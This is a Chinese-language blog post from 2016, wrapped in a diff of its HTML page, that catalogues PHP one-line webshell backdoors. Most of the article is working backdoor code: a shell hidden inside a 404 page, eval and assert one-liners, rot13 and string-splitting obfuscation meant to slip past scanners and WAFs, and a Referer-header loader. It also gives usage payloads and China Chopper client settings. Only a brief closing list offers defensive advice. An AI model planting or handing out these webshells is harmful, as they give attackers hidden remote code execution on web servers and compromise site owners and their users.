@@ -1,0 +1,633 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+
+    <!--[if lt IE 9]>
+        <style>body {display: none; background: none !important} </style>
+        <meta http-equiv="Refresh" Content="0; url=//outdatedbrowser.com/" />
+    <![endif]-->
+
+<meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+<meta name="format-detection" content="telephone=no" />
+<meta name="author" content="Toorkits" />
+
+
+
+<meta name="description" content="我们以一个学习的心态来对待这些PHP后门程序，很多PHP后门代码让我们看到程序员们是多么的用心良苦。
+强悍的PHP一句话后门
+ 这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。">
+<meta property="og:type" content="article">
+<meta property="og:title" content="那些强悍的PHP一句话后门">
+<meta property="og:url" content="https://toorkits.github.io/2016/12/28/2-那些强悍的PHP一句话后门/index.html">
+<meta property="og:site_name" content="Toorkits' blog">
+<meta property="og:description" content="我们以一个学习的心态来对待这些PHP后门程序，很多PHP后门代码让我们看到程序员们是多么的用心良苦。
+强悍的PHP一句话后门
+ 这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。">
+<meta property="og:image" content="https://toorkits.github.io/images/1.jpg">
+<meta property="og:updated_time" content="2016-12-27T03:13:04.671Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="那些强悍的PHP一句话后门">
+<meta name="twitter:description" content="我们以一个学习的心态来对待这些PHP后门程序，很多PHP后门代码让我们看到程序员们是多么的用心良苦。
+强悍的PHP一句话后门
+ 这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。">
+<meta name="twitter:image" content="https://toorkits.github.io/images/1.jpg">
+
+<link rel="apple-touch-icon" href= "/apple-touch-icon.png">
+
+
+    <link rel="alternate" href="/atom.xml" title="Toorkits&#39; blog" type="application/atom+xml">
+
+
+
+    <link rel="shortcut icon" href="/favicon.png">
+
+
+
+
+
+    <link href="//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.css" rel="stylesheet">
+
+
+
+    <script src="//cdn.bootcss.com/pace/1.0.2/pace.min.js"></script>
+    <link href="//cdn.bootcss.com/pace/1.0.2/themes/blue/pace-theme-flash.css" rel="stylesheet">
+
+
+<link rel="stylesheet" href="/css/style.css">
+
+
+
+<link href="//cdn.bootcss.com/font-awesome/4.6.3/css/font-awesome.min.css" rel="stylesheet">
+
+
+<title>那些强悍的PHP一句话后门 | Toorkits&#39; blog</title>
+
+<script src="//cdn.bootcss.com/jquery/2.2.4/jquery.min.js"></script>
+<script src="//cdn.bootcss.com/clipboard.js/1.5.10/clipboard.min.js"></script>
+
+<script>
+    var yiliaConfig = {
+        fancybox: true,
+        animate: false,
+        isHome: false,
+        isPost: true,
+        isArchive: false,
+        isTag: false,
+        isCategory: false,
+        fancybox_js: "//cdn.bootcss.com/fancybox/2.1.5/jquery.fancybox.min.js",
+        scrollreveal: "//cdn.bootcss.com/scrollReveal.js/3.1.4/scrollreveal.min.js",
+        search: undefined
+    }
+</script>
+
+
+    <script>
+        yiliaConfig.jquery_ui = [true, "//cdn.bootcss.com/jqueryui/1.10.4/jquery-ui.min.js", "//cdn.bootcss.com/jqueryui/1.10.4/css/jquery-ui.min.css"];
+    </script>
+
+
+
+    <script> yiliaConfig.rootUrl = "\/";</script>
+
+
+
+
+
+
+</head>
+<body>
+  <div id="container">
+    <div class="left-col">
+    <div class="overlay"></div>
+<div class="intrude-less">
+    <header id="header" class="inner">
+        <a href="/" class="profilepic">
+            <img src="/img/avatar.png" class="animated zoomIn">
+        </a>
+        <hgroup>
+          <h1 class="header-author"><a href="/">Toorkits</a></h1>
+        </hgroup>
+
+        
+        <p class="header-subtitle">生活不止眼前的苟且，还有诗和远方的田野!!</p>
+        
+
+        
+
+
+        
+            <div id="switch-btn" class="switch-btn">
+                <div class="icon">
+                    <div class="icon-ctn">
+                        <div class="icon-wrap icon-house" data-idx="0">
+                            <div class="birdhouse"></div>
+                            <div class="birdhouse_holes"></div>
+                        </div>
+                        <div class="icon-wrap icon-ribbon hide" data-idx="1">
+                            <div class="ribbon"></div>
+                        </div>
+                        
+                        <div class="icon-wrap icon-link hide" data-idx="2">
+                            <div class="loopback_l"></div>
+                            <div class="loopback_r"></div>
+                        </div>
+                        
+                        
+                        <div class="icon-wrap icon-me hide" data-idx="3">
+                            <div class="user"></div>
+                            <div class="shoulder"></div>
+                        </div>
+                        
+                    </div>
+                    
+                </div>
+                <div class="tips-box hide">
+                    <div class="tips-arrow"></div>
+                    <ul class="tips-inner">
+                        <li>菜单</li>
+                        <li>标签</li>
+                        
+                        <li>友情链接</li>
+                        
+                        
+                        <li>关于我</li>
+                        
+                    </ul>
+                </div>
+            </div>
+        
+
+        <div id="switch-area" class="switch-area">
+            <div class="switch-wrap">
+                <section class="switch-part switch-part1">
+                    <nav class="header-menu">
+                        <ul>
+                        
+                            <li><a href="/">主页</a></li>
+                        
+                            <li><a href="/archives/">所有文章</a></li>
+                        
+                            <li><a href="https://toorkits.github.io/">关于我</a></li>
+                        
+                        </ul>
+                    </nav>
+                    <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" href="https://toorkits.github.io/" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" href="https://toorkits.github.io/" title="知乎"></a>
+                            
+                                <a class="fa 新浪微博" href="https://toorkits.github.io/" title="新浪微博"></a>
+                            
+                        </ul>
+                    </nav>
+                </section>
+                
+                
+                <section class="switch-part switch-part2">
+                    <div class="widget tagcloud" id="js-tagcloud">
+                        
+                    </div>
+                </section>
+                
+                
+                
+                <section class="switch-part switch-part3">
+                    <div id="js-friends">
+                    
+                      <a class="main-nav-link switch-friends-link" href="http://sosec.cc">MOxFIVE</a>
+                    
+                    </div>
+                </section>
+                
+
+                
+                
+                <section class="switch-part switch-part4">
+                
+                    <div id="js-aboutme">生活不止眼前的苟且，还有诗和远方的田野。</div>
+                </section>
+                
+            </div>
+        </div>
+    </header>                
+</div>
+    </div>
+    <div class="mid-col">
+      <nav id="mobile-nav">
+      <div class="overlay">
+          <div class="slider-trigger"></div>
+          <h1 class="header-author js-mobile-header hide"><a href="/" title="回到主页">Toorkits</a></h1>
+      </div>
+    <div class="intrude-less">
+        <header id="header" class="inner">
+            <a href="/" class="profilepic">
+                <img src="/img/avatar.png" class="animated zoomIn">
+            </a>
+            <hgroup>
+              <h1 class="header-author"><a href="/" title="回到主页">Toorkits</a></h1>
+            </hgroup>
+            
+            <p class="header-subtitle">生活不止眼前的苟且，还有诗和远方的田野!!</p>
+            
+            <nav class="header-menu">
+                <ul>
+                
+                    <li><a href="/">主页</a></li>
+                
+                    <li><a href="/archives/">所有文章</a></li>
+                
+                    <li><a href="https://toorkits.github.io/">关于我</a></li>
+                
+                <div class="clearfix"></div>
+                </ul>
+            </nav>
+            <nav class="header-nav">
+                        <ul class="social">
+                            
+                                <a class="fa GitHub" target="_blank" href="https://toorkits.github.io/" title="GitHub"></a>
+                            
+                                <a class="fa 知乎" target="_blank" href="https://toorkits.github.io/" title="知乎"></a>
+                            
+                                <a class="fa 新浪微博" target="_blank" href="https://toorkits.github.io/" title="新浪微博"></a>
+                            
+                        </ul>
+            </nav>
+        </header>                
+    </div>
+    <link class="menu-list" tags="标签" friends="友情链接" about="关于我"/>
+</nav>
+      <div class="body-wrap"><article id="post-2-那些强悍的PHP一句话后门" class="article article-type-post" itemscope itemprop="blogPost">
+  
+    <div class="article-meta">
+      <a href="/2016/12/28/2-那些强悍的PHP一句话后门/" class="article-date">
+      <time datetime="2016-12-28T06:19:38.917Z" itemprop="datePublished">2016-12-28</time>
+</a>
+
+
+    </div>
+  
+  <div class="article-inner">
+    
+      <input type="hidden" class="isFancy" />
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 class="article-title" itemprop="name">
+      那些强悍的PHP一句话后门
+    </h1>
+  
+
+      </header>
+      
+      <div class="article-info article-info-post">
+        
+    <div class="article-category tagcloud">
+    <a class="article-category-link" href="/categories/渗透/">渗透</a>
+    </div>
+
+
+        
+        <div class="clearfix"></div>
+      </div>
+      
+    
+    <div class="article-entry" itemprop="articleBody">
+      
+          
+        <hr>
+<p>我们以一个学习的心态来对待这些PHP后门程序，很多PHP后门代码让我们看到程序员们是多么的用心良苦。</p>
+<p>强悍的PHP一句话后门</p>
+<p> 这类后门让网站、服务器管理员很是头疼，经常要换着方法进行各种检测，而很多新出现的编写技术，用普通的检测方法是没法发现并处理的。今天我们细数一些有意思的PHP一句话木马。</p>
+<a id="more"></a>
+<h3 id="利用404页面隐藏PHP小马："><a href="#利用404页面隐藏PHP小马：" class="headerlink" title="利用404页面隐藏PHP小马："></a>利用404页面隐藏PHP小马：</h3><pre><code class="bash">&lt;!DOCTYPE HTML PUBLIC <span class="string">"-//IETF//DTD HTML 2.0//EN"</span>&gt;   
+&lt;html&gt;&lt;head&gt;   
+&lt;title&gt;404 Not Found&lt;/title&gt;   
+&lt;/head&gt;&lt;body&gt;   
+&lt;h1&gt;Not Found&lt;/h1&gt;   
+&lt;p&gt;The requested URL was not found on this server.&lt;/p&gt;   
+&lt;/body&gt;&lt;/html&gt;   
+&lt;?php   
+@preg_replace(<span class="string">"/[pageerror]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'error'</span>],<span class="string">"saft"</span>);   
+header(<span class="string">'HTTP/1.1 404 Not Found'</span>);   
+?&gt;
+</code></pre>
+<p> 404页面是网站常用的文件，一般建议好后很少有人会去对它进行检查修改，这时我们可以利用这一点进行隐藏后门。</p>
+<h3 id="无特征隐藏PHP一句话："><a href="#无特征隐藏PHP一句话：" class="headerlink" title="无特征隐藏PHP一句话："></a>无特征隐藏PHP一句话：</h3><pre><code class="bash">&lt;?php   
+session_start();   
+<span class="variable">$_POST</span>[<span class="string">'code'</span>] &amp;&amp; <span class="variable">$_SESSION</span>[<span class="string">'theCode'</span>] = trim(<span class="variable">$_POST</span>[<span class="string">'code'</span>]);   
+<span class="variable">$_SESSION</span>[<span class="string">'theCode'</span>]&amp;&amp;preg_replace(<span class="string">'\'</span>a\<span class="string">'eis'</span>,<span class="string">'e'</span>.<span class="string">'v'</span>.<span class="string">'a'</span>.<span class="string">'l'</span>.<span class="string">'(base64_decode($_SESSION[\'</span>theCode\<span class="string">']))'</span>,<span class="string">'a'</span>);
+</code></pre>
+<p>将$_POST[‘code’]的内容赋值给$_SESSION[‘theCode’]，然后执行$_SESSION[‘theCode’]，亮点是没有特征码。用扫描工具来检查代码的话，是不会报警的，达到目的了。</p>
+<h3 id="超级隐蔽的PHP后门："><a href="#超级隐蔽的PHP后门：" class="headerlink" title="超级隐蔽的PHP后门："></a>超级隐蔽的PHP后门：</h3><pre><code class="bash">&lt;?php <span class="variable">$_GET</span>[a](<span class="variable">$_GET</span>[b]);?&gt;
+</code></pre>
+<p>仅用GET函数就构成了木马；</p>
+<p>利用方法：</p>
+<pre><code class="bash">?a=assert&amp;b=<span class="variable">${fputs%28fopen%28base64_decode%28Yy5waHA%29,w%29,base64_decode%28PD9waHAgQGV2YWwoJF9QT1NUW2NdKTsgPz4x%29%29}</span>;
+</code></pre>
+<p>执行后当前目录生成c.php一句话木马，当传参a为eval时会报错木马生成失败，为assert时同样报错，但会生成木马，真可谓不可小视，简简单单的一句话，被延伸到这般应用。</p>
+<h3 id="层级请求，编码运行PHP后门："><a href="#层级请求，编码运行PHP后门：" class="headerlink" title="层级请求，编码运行PHP后门："></a>层级请求，编码运行PHP后门：</h3><p>此方法用两个文件实现，文件1</p>
+<pre><code class="bash">&lt;?php   
+//1.php   
+header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);   
+parse_str(<span class="variable">$_SERVER</span>[<span class="string">'HTTP_REFERER'</span>], <span class="variable">$a</span>);   
+<span class="keyword">if</span>(reset(<span class="variable">$a</span>) == <span class="string">'10'</span> &amp;&amp; count(<span class="variable">$a</span>) == 9) {   
+   <span class="built_in">eval</span>(base64_decode(str_replace(<span class="string">" "</span>, <span class="string">"+"</span>, implode(array_slice(<span class="variable">$a</span>, 6)))));   
+}
+</code></pre>
+<p>文件2</p>
+<pre><code class="bash">&lt;?php   
+//2.php   header(<span class="string">'Content-type:text/html;charset=utf-8'</span>);   
+//要执行的代码   <span class="variable">$code</span> = &lt;&lt;&lt;CODE   phpinfo();   
+CODE;   
+//进行base64编码   
+<span class="variable">$code</span> = base64_encode(<span class="variable">$code</span>);   
+//构造referer字符串   
+<span class="variable">$referer</span> = <span class="string">"a=10&amp;b=ab&amp;c=34&amp;d=re&amp;e=32&amp;f=km&amp;g={<span class="variable">$code</span>}&amp;h=&amp;i="</span>;   //后门url   <span class="variable">$url</span> = <span class="string">'http://localhost/test1/1.php'</span>;   
+<span class="variable">$ch</span> = curl_init();   
+<span class="variable">$options</span> = array(   
+    CURLOPT_URL =&gt; <span class="variable">$url</span>,   
+    CURLOPT_HEADER =&gt; FALSE,   
+    CURLOPT_RETURNTRANSFER =&gt; TRUE,   
+    CURLOPT_REFERER =&gt; <span class="variable">$referer</span>   
+);   
+curl_setopt_array(<span class="variable">$ch</span>, <span class="variable">$options</span>);   
+<span class="built_in">echo</span> curl_exec(<span class="variable">$ch</span>);
+</code></pre>
+<p>通过HTTP请求中的HTTP_REFERER来运行经过base64编码的代码，来达到后门的效果，一般waf对referer这些检测要松一点，或者没有检测。用这个思路bypass waf不错。</p>
+<h3 id="PHP后门生成工具weevely"><a href="#PHP后门生成工具weevely" class="headerlink" title="PHP后门生成工具weevely"></a>PHP后门生成工具weevely</h3><p>weevely是一款针对PHP的webshell的自由软件，可用于模拟一个类似于telnet的连接shell，weevely通常用于web程序的漏洞利用，隐藏后门或者使用类似telnet的方式来代替web 页面式的管理，weevely生成的服务器端php代码是经过了base64编码的，所以可以骗过主流的杀毒软件和IDS，上传服务器端代码后通常可以通过weevely直接运行。</p>
+<p>weevely所生成的PHP后门所使用的方法是现在比较主流的base64加密结合字符串变形技术，后门中所使用的函数均是常用的字符串处理函数，被作为检查规则的eval，system等函数都不会直接出现在代码中，从而可以致使后门文件绕过后门查找工具的检查。使用暗组的Web后门查杀工具进行扫描，结果显示该文件无任何威胁。</p>
+<p> 以上是大概介绍下边是截图，相关使用方法就不在这介绍了，简单的科普一下。</p>
+<p> <img src="/images/1.jpg" alt="avatar"></p>
+<h3 id="三个变形的一句话PHP木马"><a href="#三个变形的一句话PHP木马" class="headerlink" title="三个变形的一句话PHP木马"></a>三个变形的一句话PHP木马</h3><h4 id="第一个"><a href="#第一个" class="headerlink" title="第一个"></a>第一个</h4><pre><code class="bash">&lt;?php (<span class="variable">$_</span>=@<span class="variable">$_GET</span>[2]).@<span class="variable">$_</span>(<span class="variable">$_POST</span>[1])?&gt;
+</code></pre>
+<p>在菜刀里写<a href="http://site/1.php?2=assert密码是1" target="_blank" rel="external">http://site/1.php?2=assert密码是1</a></p>
+<h4 id="第二个"><a href="#第二个" class="headerlink" title="第二个"></a>第二个</h4><pre><code class="bash">&lt;?php   
+<span class="variable">$_</span>=<span class="string">""</span>;   
+<span class="variable">$_</span>[+<span class="string">""</span>]=<span class="string">''</span>;   
+<span class="variable">$_</span>=<span class="string">"<span class="variable">$_</span>"</span>.<span class="string">""</span>;   
+<span class="variable">$_</span>=(<span class="variable">$_</span>[+<span class="string">""</span>]|<span class="string">""</span>).(<span class="variable">$_</span>[+<span class="string">""</span>]|<span class="string">""</span>).(<span class="variable">$_</span>[+<span class="string">""</span>]^<span class="string">""</span>);   
+?&gt;   
+&lt;?php
+</code></pre>
+<p>在菜刀里写<a href="http://site/2.php?_=assert&amp;__=eval($_POST[&#39;pass" target="_blank" rel="external">http://site/2.php?_=assert&amp;__=eval($_POST[&#39;pass</a>‘]) 密码是pass。如果你用菜刀的附加数据的话更隐蔽，或者用其它注射工具也可以，因为是post提交的。</p>
+<h4 id="第三个"><a href="#第三个" class="headerlink" title="第三个"></a>第三个</h4><pre><code class="bash">(<span class="variable">$b4dboy</span> = <span class="variable">$_POST</span>[<span class="string">'b4dboy'</span>]) &amp;&amp; @preg_replace(<span class="string">'/ad/e'</span>,<span class="string">'@'</span>.str_rot13(<span class="string">'riny'</span>).<span class="string">'($b4dboy)'</span>, <span class="string">'add'</span>);
+</code></pre>
+<p> str_rot13(‘riny’)即编码后的eval，完全避开了关键字，又不失效果，让人吐血！</p>
+<h3 id="最后列几个高级的PHP一句话木马后门："><a href="#最后列几个高级的PHP一句话木马后门：" class="headerlink" title="最后列几个高级的PHP一句话木马后门："></a>最后列几个高级的PHP一句话木马后门：</h3><p>1、 </p>
+<pre><code class="bash"><span class="variable">$hh</span> = <span class="string">"p"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"g"</span>.<span class="string">"_"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"p"</span>.<span class="string">"l"</span>.<span class="string">"a"</span>.<span class="string">"c"</span>.<span class="string">"e"</span>;   
+<span class="variable">$hh</span>(<span class="string">"/[discuz]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'h'</span>],<span class="string">"Access"</span>);
+</code></pre>
+<p>//菜刀一句话   </p>
+<p>2、  </p>
+<pre><code class="bash"><span class="variable">$filename</span>=<span class="variable">$_GET</span>[<span class="string">'xbid'</span>];   
+include (<span class="variable">$filename</span>);
+</code></pre>
+<p>//危险的include函数，直接编译任何文件为php格式运行<br>3、   </p>
+<pre><code class="bash"><span class="variable">$reg</span>=<span class="string">"c"</span>.<span class="string">"o"</span>.<span class="string">"p"</span>.<span class="string">"y"</span>;   
+<span class="variable">$reg</span>(<span class="variable">$_FILES</span>[MyFile][tmp_name],<span class="variable">$_FILES</span>[MyFile][name]);
+</code></pre>
+<p>//重命名任何文件<br>4、 </p>
+<pre><code class="bash"><span class="variable">$gzid</span> = <span class="string">"p"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"g"</span>.<span class="string">"_"</span>.<span class="string">"r"</span>.<span class="string">"e"</span>.<span class="string">"p"</span>.<span class="string">"l"</span>.<span class="string">"a"</span>.<span class="string">"c"</span>.<span class="string">"e"</span>;   
+<span class="variable">$gzid</span>(<span class="string">"/[discuz]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'h'</span>],<span class="string">"Access"</span>);
+</code></pre>
+<p>//菜刀一句话<br>5、</p>
+<pre><code class="bash">include (<span class="variable">$uid</span>);
+</code></pre>
+<p>//危险的include函数，直接编译任何文件为php格式运行，POST www.xxx.com/index.php?uid=/home/www/bbs/image.gif   //gif插一句话<br>6、典型一句话<br>程序后门代码  </p>
+<pre><code class="bash">&lt;?php eval_r(<span class="variable">$_POST</span>[sb])?&gt;
+</code></pre>
+<p>程序代码   </p>
+<pre><code class="bash">&lt;?php @eval_r(<span class="variable">$_POST</span>[sb])?&gt;
+</code></pre>
+<p>//容错代码<br>程序代码   </p>
+<pre><code class="bash">&lt;?php assert(<span class="variable">$_POST</span>[sb]);?&gt;
+</code></pre>
+<p>//使用lanker一句话客户端的专家模式执行相关的php语句<br>程序代码  </p>
+<pre><code class="bash">&lt;?<span class="variable">$_POST</span>[<span class="string">'sa'</span>](<span class="variable">$_POST</span>[<span class="string">'sb'</span>]);?&gt;
+</code></pre>
+<p>程序代码  </p>
+<pre><code class="bash">&lt;?<span class="variable">$_POST</span>[<span class="string">'sa'</span>](<span class="variable">$_POST</span>[<span class="string">'sb'</span>],<span class="variable">$_POST</span>[<span class="string">'sc'</span>])?&gt;
+</code></pre>
+<p>程序代码   </p>
+<pre><code class="bash">&lt;?php   
+@preg_replace(<span class="string">"/[email]/e"</span>,<span class="variable">$_POST</span>[<span class="string">'h'</span>],<span class="string">"error"</span>);   
+?&gt;
+</code></pre>
+<p>//使用这个后,使用菜刀一句话客户端在配置连接的时候在”配置”一栏输入<br>程序代码  </p>
+<pre><code class="bash">&lt;O&gt;h=@eval_r(<span class="variable">$_POST1</span>);&lt;/O&gt;
+</code></pre>
+<p>程序代码 </p>
+<pre><code class="bash">&lt;script language=<span class="string">"php"</span>&gt;@eval_r(<span class="variable">$_POST</span>[sb])&lt;/script&gt;
+</code></pre>
+<p> //绕过&lt;?限制的一句话</p>
+<p> 综上，这些PHP一句话后门可谓五脏俱全，一不小心您肯定中招了，而我们今天这篇文章的重中之重在哪呢？重点就在下边的总结!</p>
+<h3 id="如何应对PHP一句话后门："><a href="#如何应对PHP一句话后门：" class="headerlink" title="如何应对PHP一句话后门："></a>如何应对PHP一句话后门：</h3><p>我们强调几个关键点，看这文章的你相信不是门外汉，我也就不啰嗦了：</p>
+<p>1，对PHP程序编写要有安全意识<br>2，服务器日志文件要经常看，经常备份<br>3，对每个站点进行严格的权限分配<br>4，对动态文件及目录经常批量安全审查<br>5，学会如何进行手工杀毒《即行为判断查杀》<br>6，时刻关注，或渗入活跃的网络安全营地<br>7，对服务器环境层级化处理，哪怕一个函数也可做规则</p>
+<p>我们认为当管理的站点多了，数据量大时，我们应合理应用一些辅助工具，但不应完全依赖这些工具，技术是时刻在更新进步的，最为重要的是你应学会和理解，编写这些强悍后门的人所处思维，角色上的换位可为你带来更大的进步。</p>
+
+      
+    </div>
+    
+  </div>
+  
+    
+
+
+    <nav id="article-nav">
+        
+            <div id="article-nav-newer" class="article-nav-title">
+                <a href="/2016/12/28/1-SOC投入/">
+                    企业对安全运营中心（SOC）的投入真的有用吗？
+                </a>
+            </div>
+        
+        
+            <div id="article-nav-older" class="article-nav-title">
+                <a href="/2016/12/28/1my blog/">
+                    高兴，我的博客开通了
+                </a>
+            </div>
+        
+    </nav>
+
+  
+</article>
+
+    <div id="toc" class="toc-article">
+        <strong class="toc-title">文章目录</strong>
+        
+            <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#利用404页面隐藏PHP小马："><span class="toc-number">1.</span> <span class="toc-text">利用404页面隐藏PHP小马：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#无特征隐藏PHP一句话："><span class="toc-number">2.</span> <span class="toc-text">无特征隐藏PHP一句话：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#超级隐蔽的PHP后门："><span class="toc-number">3.</span> <span class="toc-text">超级隐蔽的PHP后门：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#层级请求，编码运行PHP后门："><span class="toc-number">4.</span> <span class="toc-text">层级请求，编码运行PHP后门：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#PHP后门生成工具weevely"><span class="toc-number">5.</span> <span class="toc-text">PHP后门生成工具weevely</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#三个变形的一句话PHP木马"><span class="toc-number">6.</span> <span class="toc-text">三个变形的一句话PHP木马</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#第一个"><span class="toc-number">6.1.</span> <span class="toc-text">第一个</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第二个"><span class="toc-number">6.2.</span> <span class="toc-text">第二个</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#第三个"><span class="toc-number">6.3.</span> <span class="toc-text">第三个</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#最后列几个高级的PHP一句话木马后门："><span class="toc-number">7.</span> <span class="toc-text">最后列几个高级的PHP一句话木马后门：</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#如何应对PHP一句话后门："><span class="toc-number">8.</span> <span class="toc-text">如何应对PHP一句话后门：</span></a></li></ol>
+        
+    </div>
+    <style>
+        .left-col .switch-btn,
+        .left-col .switch-area {
+            display: none;
+        }
+        .toc-level-3 i,
+        .toc-level-3 ol {
+            display: none !important;
+        }
+    </style>
+
+    <input type="button" id="tocButton" value="隐藏目录"  title="点击按钮隐藏或者显示文章目录">
+
+    <script>
+        yiliaConfig.toc = ["隐藏目录", "显示目录", !!"false"];
+    </script>
+
+
+
+    
+<div class="share">
+    
+        <div class="bdsharebuttonbox">
+            <a href="#" class="fa fa-twitter bds_twi" data-cmd="twi" title="分享到推特"></a>
+            <a href="#" class="fa fa-weibo bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a>
+            <a href="#" class="fa fa-qq bds_sqq" data-cmd="sqq" title="分享给 QQ 好友"></a>
+            <a href="#" class="fa fa-files-o bds_copy" data-cmd="copy" title="复制网址"></a>
+            <a href="#" class="fa fa fa-envelope-o bds_mail" data-cmd="mail" title="通过邮件分享"></a>
+            <a href="#" class="fa fa-weixin bds_weixin" data-cmd="weixin" title="生成文章二维码"></a>
+            <a href="#" class="fa fa-share-alt bds_more" data-cmd="more"></i></a>
+        </div>
+        <script>
+            window._bd_share_config={
+                "common":{"bdSnsKey":{},"bdText":"那些强悍的PHP一句话后门　| Toorkits' blog　","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"24"},"share":{}};with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='http://bdimg.share.baidu.com/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
+        </script>
+    
+
+    
+</div>
+
+
+
+
+
+
+
+    
+      <div class="duoshuo" id="comments">
+    <div id="comment-box" ></div>
+    <div class="ds-thread" id="ds-thread" data-thread-key="2016/12/28/2-那些强悍的PHP一句话后门/" data-title="那些强悍的PHP一句话后门" data-url="https://toorkits.github.io/2016/12/28/2-那些强悍的PHP一句话后门/"></div>
+    <script>
+        var duoshuoQuery = {short_name:"toorkits"};
+        var loadComment = function(){
+            var d = document, s = d.createElement('script');
+            s.src = (document.location.protocol == 'https:' ? 'https:' : 'http:') + '//static.duoshuo.com/embed.js';
+            s.async = true; s.charset = 'UTF-8';
+            (d.head || d.body).appendChild(s);
+        }
+
+        
+    </script>
+    
+    <script> loadComment(); </script>
+
+</div>
+    
+
+
+
+
+    <div class="scroll" id="post-nav-button">
+        
+            <a href="/2016/12/28/1-SOC投入/" title="上一篇: 企业对安全运营中心（SOC）的投入真的有用吗？">
+                <i class="fa fa-angle-left"></i>
+            </a>
+        
+
+        <a title="文章列表"><i class="fa fa-bars"></i><i class="fa fa-times"></i></a>
+
+        
+            <a href="/2016/12/28/1my blog/" title="下一篇: 高兴，我的博客开通了">
+                <i class="fa fa-angle-right"></i>
+            </a>
+        
+    </div>
+
+    <ul class="post-list"><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/1-SOC投入/">企业对安全运营中心（SOC）的投入真的有用吗？</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/2-那些强悍的PHP一句话后门/">那些强悍的PHP一句话后门</a></li><li class="post-list-item"><a class="post-list-link" href="/2016/12/28/1my blog/">高兴，我的博客开通了</a></li></ul>
+
+
+
+
+    <script>
+        
+    </script>
+</div>
+      <footer id="footer">
+    <div class="outer">
+        <div id="footer-info">
+            <div class="footer-left">
+                <i class="fa fa-copyright"></i> 
+                2012-2016 Toorkits
+            </div>
+            <div class="footer-right">
+                <a href="http://hexo.io/" target="_blank" title="快速、简洁且高效的博客框架">Hexo</a>  Theme <a href="https://github.com/MOxFIVE/hexo-theme-yelee" target="_blank" title="简而不减 Hexo 双栏博客主题  v3.5">Yelee</a> by MOxFIVE <i class="fa fa-heart animated infinite pulse"></i>
+            </div>
+        </div>
+        
+    </div>
+</footer>
+    </div>
+    
+<script data-main="/js/main.js" src="//cdn.bootcss.com/require.js/2.2.0/require.min.js"></script>
+
+
+
+
+
+<div class="scroll" id="scroll">
+    <a href="#" title="返回顶部"><i class="fa fa-arrow-up"></i></a>
+    <a href="#comments" onclick="load$hide();" title="查看评论"><i class="fa fa-comments-o"></i></a>
+    <a href="#footer" title="转到底部"><i class="fa fa-arrow-down"></i></a>
+</div>
+<script>
+    // Open in New Window
+    
+        var oOpenInNew = {
+            
+            
+            
+            
+            
+            
+             archives: ".archive-article-title", 
+             miniArchives: "a.post-list-link", 
+            
+             friends: "#js-friends a", 
+             socail: ".social a" 
+        }
+        for (var x in oOpenInNew) {
+            $(oOpenInNew[x]).attr("target", "_blank");
+        }
+    
+</script>
+
+    <script>
+        var originTitle = document.title;
+        var titleTime;
+        document.addEventListener("visibilitychange", function() {
+            if (document.hidden) {
+                document.title = "(つェ⊂) 我藏好了哦~ " + originTitle;
+                clearTimeout(titleTime);
+            }
+            else {
+                document.title = "(*´∇｀*) 被你发现啦~ " + originTitle;
+                titleTime = setTimeout(function() {
+                    document.title = originTitle;
+                }, 2000);
+            }
+        })
+    </script>
+
+<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
+</script>
+  </div>
+</body>
+</html>
